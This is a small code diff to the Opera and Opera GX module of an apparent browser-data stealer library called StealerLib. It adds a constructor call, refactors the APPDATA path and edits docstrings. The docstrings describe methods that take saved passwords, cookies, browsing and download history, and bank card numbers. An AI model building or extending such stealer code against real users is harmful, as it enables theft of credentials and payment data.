@@ -24,10 +24,12 @@ class Opera:
     """
 
     def __init__(self):
-        self.roaming = os.getenv("APPDATA")
+        super(Opera, self).__init__()
+
+        self.roaming = roaming = os.getenv("APPDATA")
         self.paths = {
-            'operagx': self.roaming + '\\Opera Software\\Opera GX Stable',
-            'opera': self.roaming + '\\Opera Software\\Opera Stable'
+            'operagx': roaming + '\\Opera Software\\Opera GX Stable',
+            'opera': roaming + '\\Opera Software\\Opera Stable'
         }
 
         self.opera_passwords = []
@@ -110,7 +112,7 @@ class Opera:
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the passwords from
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
@@ -154,7 +156,7 @@ class Opera:
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the cookie information from
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
@@ -201,7 +203,7 @@ class Opera:
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the web history from
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
@@ -244,7 +246,7 @@ class Opera:
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the download history from
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (tab_url, local_path) lists (derived from BrowserTypes conv())
@@ -285,7 +287,7 @@ class Opera:
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the bank cards from from
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
